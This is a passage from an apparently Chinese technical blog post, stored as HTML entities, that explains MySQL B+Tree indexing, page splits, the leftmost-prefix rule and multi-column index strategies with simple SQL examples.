&#x5B58;&#x53D6;&#x7684;&#x6D88;&#x8017;&#x8981;&#x9AD8;&#x51E0;&#x4E2A;&#x6570;&#x91CF;&#x7EA7;&#x3002;&#x53EF;&#x4EE5;&#x60F3;&#x8C61;&#x4E00;&#x4E0B;&#x4E00;&#x68F5;&#x51E0;&#x767E;&#x4E07;&#x8282;&#x70B9;&#x7684;&#x4E8C;&#x53C9;&#x6811;&#x7684;&#x6DF1;&#x5EA6;&#x662F;&#x591A;&#x5C11;&#xFF1F;&#x5982;&#x679C;&#x5C06;&#x8FD9;&#x4E48;&#x5927;&#x6DF1;&#x5EA6;&#x7684;&#x4E00;&#x9897;&#x4E8C;&#x53C9;&#x6811;&#x653E;&#x78C1;&#x76D8;&#x4E0A;&#xFF0C;&#x6BCF;&#x8BFB;&#x53D6;&#x4E00;&#x4E2A;&#x8282;&#x70B9;&#xFF0C;&#x9700;&#x8981;&#x4E00;&#x6B21;&#x78C1;&#x76D8;&#x7684; I/O &#x8BFB;&#x53D6;&#xFF0C;&#x6574;&#x4E2A;&#x67E5;&#x627E;&#x7684;&#x8017;&#x65F6;&#x663E;&#x7136;&#x662F;&#x4E0D;&#x80FD;&#x591F;&#x63A5;&#x53D7;&#x7684;&#x3002;&#x90A3;&#x4E48;&#x5982;&#x4F55;&#x51CF;&#x5C11;&#x67E5;&#x627E;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684; I/O &#x5B58;&#x53D6;&#x6B21;&#x6570;&#xFF1F;</p><p>&#x4E00;&#x79CD;&#x884C;&#x4E4B;&#x6709;&#x6548;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#x662F;&#x51CF;&#x5C11;&#x6811;&#x7684;&#x6DF1;&#x5EA6;&#xFF0C;&#x5C06;&#x4E8C;&#x53C9;&#x6811;&#x53D8;&#x4E3A; m &#x53C9;&#x6811;&#xFF08;&#x591A;&#x8DEF;&#x641C;&#x7D22;&#x6811;&#xFF09;&#xFF0C;&#x800C;B+Tree&#x5C31;&#x662F;&#x4E00;&#x79CD;&#x591A;&#x8DEF;&#x641C;&#x7D22;&#x6811;&#x3002;&#x7406;&#x89E3;B+Tree&#x65F6;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x7406;&#x89E3;&#x5176;&#x6700;&#x91CD;&#x8981;&#x7684;&#x4E24;&#x4E2A;&#x7279;&#x5F81;&#x5373;&#x53EF;&#xFF1A;&#x7B2C;&#x4E00;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x5173;&#x952E;&#x5B57;&#xFF08;&#x53EF;&#x4EE5;&#x7406;&#x89E3;&#x4E3A;&#x6570;&#x636E;&#xFF09;&#x90FD;&#x5B58;&#x50A8;&#x5728;&#x53F6;&#x5B50;&#x8282;&#x70B9;&#xFF08;Leaf Page&#xFF09;&#xFF0C;&#x975E;&#x53F6;&#x5B50;&#x8282;&#x70B9;&#xFF08;Index Page&#xFF09;&#x5E76;&#x4E0D;&#x5B58;&#x50A8;&#x771F;&#x6B63;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x6240;&#x6709;&#x8BB0;&#x5F55;&#x8282;&#x70B9;&#x90FD;&#x662F;&#x6309;&#x952E;&#x503C;&#x5927;&#x5C0F;&#x987A;&#x5E8F;&#x5B58;&#x653E;&#x5728;&#x540C;&#x4E00;&#x5C42;&#x53F6;&#x5B50;&#x8282;&#x70B9;&#x4E0A;&#x3002;&#x5176;&#x6B21;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x53F6;&#x5B50;&#x8282;&#x70B9;&#x7531;&#x6307;&#x9488;&#x8FDE;&#x63A5;&#x3002;&#x5982;&#x4E0B;&#x56FE;&#x4E3A;&#x9AD8;&#x5EA6;&#x4E3A; 2 &#x7684;&#x7B80;&#x5316;&#x4E86;&#x7684;B+Tree&#x3002;<br><img src="/2019/03/29/mysql-optimization-principle-1/erbtree.jpg" title="erbtree"></p><p>&#x600E;&#x4E48;&#x7406;&#x89E3;&#x8FD9;&#x4E24;&#x4E2A;&#x7279;&#x5F81;&#xFF1F;MySQL &#x5C06;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x7684;&#x5927;&#x5C0F;&#x8BBE;&#x7F6E;&#x4E3A;&#x4E00;&#x4E2A;&#x9875;&#x7684;&#x6574;&#x6570;&#x500D;&#xFF08;&#x539F;&#x56E0;&#x4E0B;&#x6587;&#x4F1A;&#x4ECB;&#x7ECD;&#xFF09;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5728;&#x8282;&#x70B9;&#x7A7A;&#x95F4;&#x5927;&#x5C0F;&#x4E00;&#x5B9A;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x53EF;&#x4EE5;&#x5B58;&#x50A8;&#x66F4;&#x591A;&#x7684;&#x5185;&#x7ED3;&#x70B9;&#xFF0C;&#x8FD9;&#x6837;&#x6BCF;&#x4E2A;&#x7ED3;&#x70B9;&#x80FD;&#x7D22;&#x5F15;&#x7684;&#x8303;&#x56F4;&#x66F4;&#x5927;&#x66F4;&#x7CBE;&#x786E;&#x3002;&#x6240;&#x6709;&#x7684;&#x53F6;&#x5B50;&#x8282;&#x70B9;&#x4F7F;&#x7528;&#x6307;&#x9488;&#x94FE;&#x63A5;&#x7684;&#x597D;&#x5904;&#x662F;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x533A;&#x95F4;&#x8BBF;&#x95EE;&#xFF0C;&#x6BD4;&#x5982;&#x4E0A;&#x56FE;&#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x67E5;&#x627E;&#x5927;&#x4E8E; 20 &#x800C;&#x5C0F;&#x4E8E; 30 &#x7684;&#x8BB0;&#x5F55;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x627E;&#x5230;&#x8282;&#x70B9; 20&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x904D;&#x5386;&#x6307;&#x9488;&#x4F9D;&#x6B21;&#x627E;&#x5230; 25&#x3001;30&#x3002;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x94FE;&#x63A5;&#x6307;&#x9488;&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x65E0;&#x6CD5;&#x8FDB;&#x884C;&#x533A;&#x95F4;&#x67E5;&#x627E;&#x3002;&#x8FD9;&#x4E5F;&#x662F; MySQL &#x4F7F;&#x7528;B+Tree&#x4F5C;&#x4E3A;&#x7D22;&#x5F15;&#x5B58;&#x50A8;&#x7ED3;&#x6784;&#x7684;&#x91CD;&#x8981;&#x539F;&#x56E0;&#x3002;</p><p>MySQL &#x4E3A;&#x4F55;&#x5C06;&#x8282;&#x70B9;&#x5927;&#x5C0F;&#x8BBE;&#x7F6E;&#x4E3A;&#x9875;&#x7684;&#x6574;&#x6570;&#x500D;&#xFF0C;&#x8FD9;&#x5C31;&#x9700;&#x8981;&#x7406;&#x89E3;&#x78C1;&#x76D8;&#x7684;&#x5B58;&#x50A8;&#x539F;&#x7406;&#x3002;&#x78C1;&#x76D8;&#x672C;&#x8EAB;&#x5B58;&#x53D6;&#x5C31;&#x6BD4;&#x4E3B;&#x5B58;&#x6162;&#x5F88;&#x591A;&#xFF0C;&#x5728;&#x52A0;&#x4E0A;&#x673A;&#x68B0;&#x8FD0;&#x52A8;&#x635F;&#x8017;&#xFF08;&#x7279;&#x522B;&#x662F;&#x666E;&#x901A;&#x7684;&#x673A;&#x68B0;&#x786C;&#x76D8;&#xFF09;&#xFF0C;&#x78C1;&#x76D8;&#x7684;&#x5B58;&#x53D6;&#x901F;&#x5EA6;&#x5F80;&#x5F80;&#x662F;&#x4E3B;&#x5B58;&#x7684;&#x51E0;&#x767E;&#x4E07;&#x5206;&#x4E4B;&#x4E00;&#xFF0C;&#x4E3A;&#x4E86;&#x5C3D;&#x91CF;&#x51CF;&#x5C11;&#x78C1;&#x76D8; I/O&#xFF0C;&#x78C1;&#x76D8;&#x5F80;&#x5F80;&#x4E0D;&#x662F;&#x4E25;&#x683C;&#x6309;&#x9700;&#x8BFB;&#x53D6;&#xFF0C;&#x800C;&#x662F;&#x6BCF;&#x6B21;&#x90FD;&#x4F1A;&#x9884;&#x8BFB;&#xFF0C;&#x5373;&#x4F7F;&#x53EA;&#x9700;&#x8981;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x78C1;&#x76D8;&#x4E5F;&#x4F1A;&#x4ECE;&#x8FD9;&#x4E2A;&#x4F4D;&#x7F6E;&#x5F00;&#x59CB;&#xFF0C;&#x987A;&#x5E8F;&#x5411;&#x540E;&#x8BFB;&#x53D6;&#x4E00;&#x5B9A;&#x957F;&#x5EA6;&#x7684;&#x6570;&#x636E;&#x653E;&#x5165;&#x5185;&#x5B58;&#xFF0C;&#x9884;&#x8BFB;&#x7684;&#x957F;&#x5EA6;&#x4E00;&#x822C;&#x4E3A;&#x9875;&#x7684;&#x6574;&#x6570;&#x500D;&#x3002;</p><blockquote><p>&#x9875;&#x662F;&#x8BA1;&#x7B97;&#x673A;&#x7BA1;&#x7406;&#x5B58;&#x50A8;&#x5668;&#x7684;&#x903B;&#x8F91;&#x5757;&#xFF0C;&#x786C;&#x4EF6;&#x53CA; OS &#x5F80;&#x5F80;&#x5C06;&#x4E3B;&#x5B58;&#x548C;&#x78C1;&#x76D8;&#x5B58;&#x50A8;&#x533A;&#x5206;&#x5272;&#x4E3A;&#x8FDE;&#x7EED;&#x7684;&#x5927;&#x5C0F;&#x76F8;&#x7B49;&#x7684;&#x5757;&#xFF0C;&#x6BCF;&#x4E2A;&#x5B58;&#x50A8;&#x5757;&#x79F0;&#x4E3A;&#x4E00;&#x9875;&#xFF08;&#x8BB8;&#x591A; OS &#x4E2D;&#xFF0C;&#x9875;&#x7684;&#x5927;&#x5C0F;&#x901A;&#x5E38;&#x4E3A; 4K&#xFF09;&#x3002;&#x4E3B;&#x5B58;&#x548C;&#x78C1;&#x76D8;&#x4EE5;&#x9875;&#x4E3A;&#x5355;&#x4F4D;&#x4EA4;&#x6362;&#x6570;&#x636E;&#x3002;&#x5F53;&#x7A0B;&#x5E8F;&#x8981;&#x8BFB;&#x53D6;&#x7684;&#x6570;&#x636E;&#x4E0D;&#x5728;&#x4E3B;&#x5B58;&#x4E2D;&#x65F6;&#xFF0C;&#x4F1A;&#x89E6;&#x53D1;&#x4E00;&#x4E2A;&#x7F3A;&#x9875;&#x5F02;&#x5E38;&#xFF0C;&#x6B64;&#x65F6;&#x7CFB;&#x7EDF;&#x4F1A;&#x5411;&#x78C1;&#x76D8;&#x53D1;&#x51FA;&#x8BFB;&#x76D8;&#x4FE1;&#x53F7;&#xFF0C;&#x78C1;&#x76D8;&#x4F1A;&#x627E;&#x5230;&#x6570;&#x636E;&#x7684;&#x8D77;&#x59CB;&#x4F4D;&#x7F6E;&#x5E76;&#x5411;&#x540E;&#x8FDE;&#x7EED;&#x8BFB;&#x53D6;&#x4E00;&#x9875;&#x6216;&#x51E0;&#x9875;&#x8F7D;&#x5165;&#x5185;&#x5B58;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x4E00;&#x8D77;&#x8FD4;&#x56DE;&#xFF0C;&#x7A0B;&#x5E8F;&#x7EE7;&#x7EED;&#x8FD0;&#x884C;&#x3002;</p></blockquote><p>MySQL &#x5DE7;&#x5999;&#x5229;&#x7528;&#x4E86;&#x78C1;&#x76D8;&#x9884;&#x8BFB;&#x539F;&#x7406;&#xFF0C;&#x5C06;&#x4E00;&#x4E2A;&#x8282;&#x70B9;&#x7684;&#x5927;&#x5C0F;&#x8BBE;&#x4E3A;&#x7B49;&#x4E8E;&#x4E00;&#x4E2A;&#x9875;&#xFF0C;&#x8FD9;&#x6837;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x53EA;&#x9700;&#x8981;&#x4E00;&#x6B21; I/O &#x5C31;&#x53EF;&#x4EE5;&#x5B8C;&#x5168;&#x8F7D;&#x5165;&#x3002;&#x4E3A;&#x4E86;&#x8FBE;&#x5230;&#x8FD9;&#x4E2A;&#x76EE;&#x7684;&#xFF0C;&#x6BCF;&#x6B21;&#x65B0;&#x5EFA;&#x8282;&#x70B9;&#x65F6;&#xFF0C;&#x76F4;&#x63A5;&#x7533;&#x8BF7;&#x4E00;&#x4E2A;&#x9875;&#x7684;&#x7A7A;&#x95F4;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x4FDD;&#x8BC1;&#x4E00;&#x4E2A;&#x8282;&#x70B9;&#x7269;&#x7406;&#x4E0A;&#x4E5F;&#x5B58;&#x50A8;&#x5728;&#x4E00;&#x4E2A;&#x9875;&#x91CC;&#xFF0C;&#x52A0;&#x4E4B;&#x8BA1;&#x7B97;&#x673A;&#x5B58;&#x50A8;&#x5206;&#x914D;&#x90FD;&#x662F;&#x6309;&#x9875;&#x5BF9;&#x9F50;&#x7684;&#xFF0C;&#x5C31;&#x5B9E;&#x73B0;&#x4E86;&#x8BFB;&#x53D6;&#x4E00;&#x4E2A;&#x8282;&#x70B9;&#x53EA;&#x9700;&#x4E00;&#x6B21; I/O&#x3002;&#x5047;&#x8BBE;B+Tree&#x7684;&#x9AD8;&#x5EA6;&#x4E3A; h&#xFF0C;&#x4E00;&#x6B21;&#x68C0;&#x7D22;&#x6700;&#x591A;&#x9700;&#x8981;h-1&#x6B21; I/O&#xFF08;&#x6839;&#x8282;&#x70B9;&#x5E38;&#x9A7B;&#x5185;&#x5B58;&#xFF09;&#xFF0C;&#x590D;&#x6742;&#x5EA6; O(h) = O(logmN)&#x3002;&#x5B9E;&#x9645;&#x5E94;&#x7528;&#x573A;&#x666F;&#x4E2D;&#xFF0C;M &#x901A;&#x5E38;&#x8F83;&#x5927;&#xFF0C;&#x5E38;&#x5E38;&#x8D85;&#x8FC7; 100&#xFF0C;&#x56E0;&#x6B64;&#x6811;&#x7684;&#x9AD8;&#x5EA6;&#x4E00;&#x822C;&#x90FD;&#x6BD4;&#x8F83;&#x5C0F;&#xFF0C;&#x901A;&#x5E38;&#x4E0D;&#x8D85;&#x8FC7; 3&#x3002;</p><p>&#x6700;&#x540E;&#x7B80;&#x5355;&#x4E86;&#x89E3;&#x4E0B;B+Tree&#x8282;&#x70B9;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x5728;&#x6574;&#x4F53;&#x4E0A;&#x5BF9;&#x7D22;&#x5F15;&#x7684;&#x7EF4;&#x62A4;&#x6709;&#x4E00;&#x4E2A;&#x5927;&#x6982;&#x7684;&#x4E86;&#x89E3;&#xFF0C;&#x867D;&#x7136;&#x7D22;&#x5F15;&#x53EF;&#x4EE5;&#x5927;&#x5927;&#x63D0;&#x9AD8;&#x67E5;&#x8BE2;&#x6548;&#x7387;&#xFF0C;&#x4F46;&#x7EF4;&#x62A4;&#x7D22;&#x5F15;&#x4ECD;&#x8981;&#x82B1;&#x8D39;&#x5F88;&#x5927;&#x7684;&#x4EE3;&#x4EF7;&#xFF0C;&#x56E0;&#x6B64;&#x5408;&#x7406;&#x7684;&#x521B;&#x5EFA;&#x7D22;&#x5F15;&#x4E5F;&#x5C31;&#x5C24;&#x4E3A;&#x91CD;&#x8981;&#x3002;</p><p>&#x4ECD;&#x4EE5;&#x4E0A;&#x9762;&#x7684;&#x6811;&#x4E3A;&#x4F8B;&#xFF0C;&#x6211;&#x4EEC;&#x5047;&#x8BBE;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x53EA;&#x80FD;&#x5B58;&#x50A8; 4 &#x4E2A;&#x5185;&#x8282;&#x70B9;&#x3002;&#x9996;&#x5148;&#x8981;&#x63D2;&#x5165;&#x7B2C;&#x4E00;&#x4E2A;&#x8282;&#x70B9; 28&#xFF0C;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#x3002;<br><img src="/2019/03/29/mysql-optimization-principle-1/chazhao.jpg" title="chazhao"></p><p>&#x63A5;&#x7740;&#x63D2;&#x5165;&#x4E0B;&#x4E00;&#x4E2A;&#x8282;&#x70B9; 70&#xFF0C;&#x5728; Index Page &#x4E2D;&#x67E5;&#x8BE2;&#x540E;&#x5F97;&#x77E5;&#x5E94;&#x8BE5;&#x63D2;&#x5165;&#x5230; 50 - 70 &#x4E4B;&#x95F4;&#x7684;&#x53F6;&#x5B50;&#x8282;&#x70B9;&#xFF0C;&#x4F46;&#x53F6;&#x5B50;&#x8282;&#x70B9;&#x5DF2;&#x6EE1;&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#x5C31;&#x9700;&#x8981;&#x8FDB;&#x884C;&#x4E5F;&#x5206;&#x88C2;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x5F53;&#x524D;&#x7684;&#x53F6;&#x5B50;&#x8282;&#x70B9;&#x8D77;&#x70B9;&#x4E3A; 50&#xFF0C;&#x6240;&#x4EE5;&#x6839;&#x636E;&#x4E2D;&#x95F4;&#x503C;&#x6765;&#x62C6;&#x5206;&#x53F6;&#x5B50;&#x8282;&#x70B9;&#xFF0C;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#x3002;<br><img src="/2019/03/29/mysql-optimization-principle-1/pagechazhao.jpg" title="pagechazhao"></p><p>&#x6700;&#x540E;&#x63D2;&#x5165;&#x4E00;&#x4E2A;&#x8282;&#x70B9; 95&#xFF0C;&#x8FD9;&#x65F6;&#x5019; Index Page &#x548C; Leaf Page &#x90FD;&#x6EE1;&#x4E86;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x505A;&#x4E24;&#x6B21;&#x62C6;&#x5206;&#xFF0C;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#x3002;<br><img src="/2019/03/29/mysql-optimization-principle-1/zhaodao.jpg" title="zhaodao"></p><p>Leaf Page &#x4E0E; Index Page &#x62C6;&#x5206;&#x540E;&#x6700;&#x7EC8;&#x5F62;&#x6210;&#x4E86;&#x8FD9;&#x6837;&#x4E00;&#x9897;&#x6811;&#x3002;<br><img src="/2019/03/29/mysql-optimization-principle-1/leaf.jpg" title="leaf"></p><p>B+Tree&#x4E3A;&#x4E86;&#x4FDD;&#x6301;&#x5E73;&#x8861;&#xFF0C;&#x5BF9;&#x4E8E;&#x65B0;&#x63D2;&#x5165;&#x7684;&#x503C;&#x9700;&#x8981;&#x505A;&#x5927;&#x91CF;&#x7684;&#x62C6;&#x5206;&#x9875;&#x64CD;&#x4F5C;&#xFF0C;&#x800C;&#x9875;&#x7684;&#x62C6;&#x5206;&#x9700;&#x8981; I/O &#x64CD;&#x4F5C;&#xFF0C;&#x4E3A;&#x4E86;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x51CF;&#x5C11;&#x9875;&#x7684;&#x62C6;&#x5206;&#x64CD;&#x4F5C;&#xFF0C;B+Tree&#x4E5F;&#x63D0;&#x4F9B;&#x4E86;&#x7C7B;&#x4F3C;&#x4E8E;&#x5E73;&#x8861;&#x4E8C;&#x53C9;&#x6811;&#x7684;&#x65CB;&#x8F6C;&#x529F;&#x80FD;&#x3002;&#x5F53; Leaf Page &#x5DF2;&#x6EE1;&#x4F46;&#x5176;&#x5DE6;&#x53F3;&#x5144;&#x5F1F;&#x8282;&#x70B9;&#x6CA1;&#x6709;&#x6EE1;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;B+Tree&#x5E76;&#x4E0D;&#x6025;&#x4E8E;&#x53BB;&#x505A;&#x62C6;&#x5206;&#x64CD;&#x4F5C;&#xFF0C;&#x800C;&#x662F;&#x5C06;&#x8BB0;&#x5F55;&#x79FB;&#x5230;&#x5F53;&#x524D;&#x6240;&#x5728;&#x9875;&#x7684;&#x5144;&#x5F1F;&#x8282;&#x70B9;&#x4E0A;&#x3002;&#x901A;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5DE6;&#x5144;&#x5F1F;&#x4F1A;&#x88AB;&#x5148;&#x68C0;&#x67E5;&#x7528;&#x6765;&#x505A;&#x65CB;&#x8F6C;&#x64CD;&#x4F5C;&#x3002;&#x5C31;&#x6BD4;&#x5982;&#x4E0A;&#x9762;&#x7B2C;&#x4E8C;&#x4E2A;&#x793A;&#x4F8B;&#xFF0C;&#x5F53;&#x63D2;&#x5165; 70 &#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5E76;&#x4E0D;&#x4F1A;&#x53BB;&#x505A;&#x9875;&#x62C6;&#x5206;&#xFF0C;&#x800C;&#x662F;&#x5DE6;&#x65CB;&#x64CD;&#x4F5C;&#x3002;<br><img src="/2019/03/29/mysql-optimization-principle-1/zuoxuan.jpg" title="zuoxuan"></p><p>&#x901A;&#x8FC7;&#x65CB;&#x8F6C;&#x64CD;&#x4F5C;&#x53EF;&#x4EE5;&#x6700;&#x5927;&#x9650;&#x5EA6;&#x7684;&#x51CF;&#x5C11;&#x9875;&#x5206;&#x88C2;&#xFF0C;&#x4ECE;&#x800C;&#x51CF;&#x5C11;&#x7D22;&#x5F15;&#x7EF4;&#x62A4;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684;&#x78C1;&#x76D8;&#x7684; I/O &#x64CD;&#x4F5C;&#xFF0C;&#x4E5F;&#x63D0;&#x9AD8;&#x7D22;&#x5F15;&#x7EF4;&#x62A4;&#x6548;&#x7387;&#x3002;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x5220;&#x9664;&#x8282;&#x70B9;&#x8DDF;&#x63D2;&#x5165;&#x8282;&#x70B9;&#x7C7B;&#x4F3C;&#xFF0C;&#x4ECD;&#x7136;&#x9700;&#x8981;&#x65CB;&#x8F6C;&#x548C;&#x62C6;&#x5206;&#x64CD;&#x4F5C;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x518D;&#x8BF4;&#x660E;&#x3002;</p><p><strong>&#x9AD8;&#x6027;&#x80FD;&#x7B56;&#x7565;</strong><br>&#x901A;&#x8FC7;&#x4E0A;&#x6587;&#xFF0C;&#x76F8;&#x4FE1;&#x4F60;&#x5BF9;B+Tree&#x7684;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x5DF2;&#x7ECF;&#x6709;&#x4E86;&#x5927;&#x81F4;&#x7684;&#x4E86;&#x89E3;&#xFF0C;&#x4F46; MySQL &#x4E2D;&#x7D22;&#x5F15;&#x662F;&#x5982;&#x4F55;&#x7EC4;&#x7EC7;&#x6570;&#x636E;&#x7684;&#x5B58;&#x50A8;&#x5462;&#xFF1F;&#x4EE5;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x793A;&#x4F8B;&#x6765;&#x8BF4;&#x660E;&#xFF0C;&#x5047;&#x5982;&#x6709;&#x5982;&#x4E0B;&#x6570;&#x636E;&#x8868;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE People(</span><br><span class="line">    last_name varchar(50) not null,</span><br><span class="line">    first_name varchar(50) not null,</span><br><span class="line">    dob date not null,</span><br><span class="line">    gender enum(`m`,`f`) not null,</span><br><span class="line">    key(last_name,first_name,dob)</span><br><span class="line">);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5BF9;&#x4E8E;&#x8868;&#x4E2D;&#x6BCF;&#x4E00;&#x884C;&#x6570;&#x636E;&#xFF0C;&#x7D22;&#x5F15;&#x4E2D;&#x5305;&#x542B;&#x4E86; last_name&#x3001;first_name&#x3001;dob &#x5217;&#x7684;&#x503C;&#xFF0C;&#x4E0B;&#x56FE;&#x5C55;&#x793A;&#x4E86;&#x7D22;&#x5F15;&#x662F;&#x5982;&#x4F55;&#x7EC4;&#x7EC7;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x7684;&#x3002;<br><img src="/2019/03/29/mysql-optimization-principle-1/IMG.png" title="IMG"></p><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x7D22;&#x5F15;&#x9996;&#x5148;&#x6839;&#x636E;&#x7B2C;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5;&#x6765;&#x6392;&#x5217;&#x987A;&#x5E8F;&#xFF0C;&#x5F53;&#x540D;&#x5B57;&#x76F8;&#x540C;&#x65F6;&#xFF0C;&#x5219;&#x6839;&#x636E;&#x7B2C;&#x4E09;&#x4E2A;&#x5B57;&#x6BB5;&#xFF0C;&#x5373;&#x51FA;&#x751F;&#x65E5;&#x671F;&#x6765;&#x6392;&#x5E8F;&#xFF0C;&#x6B63;&#x662F;&#x56E0;&#x4E3A;&#x8FD9;&#x4E2A;&#x539F;&#x56E0;&#xFF0C;&#x624D;&#x6709;&#x4E86;&#x7D22;&#x5F15;&#x7684; &#x201C;&#x6700;&#x5DE6;&#x539F;&#x5219;&#x201D;&#x3002;</p><p><strong>MySQL &#x4E0D;&#x4F1A;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x7684;&#x60C5;&#x51B5;&#xFF1A;&#x975E;&#x72EC;&#x7ACB;&#x7684;&#x5217;</strong></p><p>&#x201C;&#x72EC;&#x7ACB;&#x7684;&#x5217;&#x201D; &#x662F;&#x6307;&#x7D22;&#x5F15;&#x5217;&#x4E0D;&#x80FD;&#x662F;&#x8868;&#x8FBE;&#x5F0F;&#x7684;&#x4E00;&#x90E8;&#x5206;&#xFF0C;&#x4E5F;&#x4E0D;&#x80FD;&#x662F;&#x51FD;&#x6570;&#x7684;&#x53C2;&#x6570;&#x3002;&#x6BD4;&#x5982;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from <span class="built_in">where</span> id + 1 = 5</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x5F88;&#x5BB9;&#x6613;&#x770B;&#x51FA;&#x5176;&#x7B49;&#x4EF7;&#x4E8E; id = 4&#xFF0C;&#x4F46;&#x662F; MySQL &#x65E0;&#x6CD5;&#x81EA;&#x52A8;&#x89E3;&#x6790;&#x8FD9;&#x4E2A;&#x8868;&#x8FBE;&#x5F0F;&#xFF0C;&#x4F7F;&#x7528;&#x51FD;&#x6570;&#x662F;&#x540C;&#x6837;&#x7684;&#x9053;&#x7406;&#x3002;</p><p><strong>&#x524D;&#x7F00;&#x7D22;&#x5F15;</strong><br>&#x5982;&#x679C;&#x5217;&#x5F88;&#x957F;&#xFF0C;&#x901A;&#x5E38;&#x53EF;&#x4EE5;&#x7D22;&#x5F15;&#x5F00;&#x59CB;&#x7684;&#x90E8;&#x5206;&#x5B57;&#x7B26;&#xFF0C;&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x6709;&#x6548;&#x8282;&#x7EA6;&#x7D22;&#x5F15;&#x7A7A;&#x95F4;&#xFF0C;&#x4ECE;&#x800C;&#x63D0;&#x9AD8;&#x7D22;&#x5F15;&#x6548;&#x7387;&#x3002;</p><p><strong>&#x591A;&#x5217;&#x7D22;&#x5F15;&#x548C;&#x7D22;&#x5F15;&#x987A;&#x5E8F;</strong><br>&#x5728;&#x591A;&#x6570;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5728;&#x591A;&#x4E2A;&#x5217;&#x4E0A;&#x5EFA;&#x7ACB;&#x72EC;&#x7ACB;&#x7684;&#x7D22;&#x5F15;&#x5E76;&#x4E0D;&#x80FD;&#x63D0;&#x9AD8;&#x67E5;&#x8BE2;&#x6027;&#x80FD;&#x3002;&#x7406;&#x7531;&#x975E;&#x5E38;&#x7B80;&#x5355;&#xFF0C;MySQL &#x4E0D;&#x77E5;&#x9053;&#x9009;&#x62E9;&#x54EA;&#x4E2A;&#x7D22;&#x5F15;&#x7684;&#x67E5;&#x8BE2;&#x6548;&#x7387;&#x66F4;&#x597D;&#xFF0C;&#x6240;&#x4EE5;&#x5728;&#x8001;&#x7248;&#x672C;&#xFF0C;&#x6BD4;&#x5982; MySQL5.0 &#x4E4B;&#x524D;&#x5C31;&#x4F1A;&#x968F;&#x4FBF;&#x9009;&#x62E9;&#x4E00;&#x4E2A;&#x5217;&#x7684;&#x7D22;&#x5F15;&#xFF0C;&#x800C;&#x65B0;&#x7684;&#x7248;&#x672C;&#x4F1A;&#x91C7;&#x7528;&#x5408;&#x5E76;&#x7D22;&#x5F15;&#x7684;&#x7B56;&#x7565;&#x3002;&#x4E3E;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;&#xFF0C;&#x5728;&#x4E00;&#x5F20;&#x7535;&#x5F71;&#x6F14;&#x5458;&#x8868;&#x4E2D;&#xFF0C;&#x5728; actor_id &#x548C; film_id &#x4E24;&#x4E2A;&#x5217;&#x4E0A;&#x90FD;&#x5EFA;&#x7ACB;&#x4E86;&#x72EC;&#x7ACB;&#x7684;&#x7D22;&#x5F15;&#xFF0C;&#x7136;&#x540E;&#x6709;&#x5982;&#x4E0B;&#x67E5;&#x8BE2;&#xFF1A;</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select film_id,actor_id from film_actor <span class="built_in">where</span> actor_id = 1 or film_id = 1</span><br></pre></td></tr></tbody></table></figure><p>&#x8001;&#x7248;&#x672C;&#x7684; MySQL &#x4F1A;&#x968F;&#x673A;&#x9009;&#x62E9;&#x4E00;&#x4E2A;&#x7D22;&#x5F15;&#xFF0C;&#x4F46;&#x65B0;&#x7248;&#x672C;&#x505A;&#x5982;&#x4E0B;&#x7684;&#x4F18;&#x5316;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span 